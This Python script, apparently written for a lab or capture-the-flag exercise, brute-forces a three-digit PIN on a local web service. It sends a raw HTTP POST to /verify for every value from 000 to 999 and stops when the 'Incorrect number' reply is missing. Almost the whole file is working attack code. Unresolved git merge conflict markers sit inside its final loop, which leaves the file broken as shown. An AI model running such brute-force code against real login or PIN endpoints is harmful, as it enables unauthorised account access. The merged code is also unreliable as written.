import socket
import time

HOST = "127.0.0.1" #capture using wireshark
PORT = 8888 #i use nmap to find the port
DELAY = 1.2 

def try_pin(pin): #function to try single PIN
    pin_str = f"{pin:03d}"  #format it to 3-digit string
    data = f"magicNumber={pin_str}" #the data i want to sent in the POST body

    request = (                                # raw HTTP POST request, from wireshark
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{data}"
    )

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:    #sockect that connect to the server and encoded request string
        sock.connect((HOST, PORT))
        sock.sendall(request.encode())

        response = b""   #byte string to hold server reply
        while True:
            chunk = sock.recv(1024)  #loop to recieves chunks of data from the socket
            if not chunk:    #empty byte string
                break            #the server closed the connection
            response += chunk     #append each chunnk to response variable

    decoded = response.decode(errors="ignore")  #once recieve, it decode it into string. The error=ignore is for non-UTF-8 caharacters
    return decoded, pin_str #return both the decoded response and the attempted pin_str to use them in the next step

for pin in range(1000):
    response, pin_str = try_pin(pin) #loop through all possible 3 digit pin combination
    print(f"Try pin {pin_str}...") #print out all current pin being tried

<<<<<<< HEAD
    if "Incorrect number" not in response: # if there is no response that says "Incorrect number then that PIN is the correct PIN
        print(f"\nFound the correct PIN: {pin_str}") #mission accomplished 
=======
    if "Incorrect number" not in response:
        print(f"\nFound the correct PIN: {pin_str}")
>>>>>>> 7d8cf950346b7473736eda19eb0b401685195b89
        break

    time.sleep(DELAY)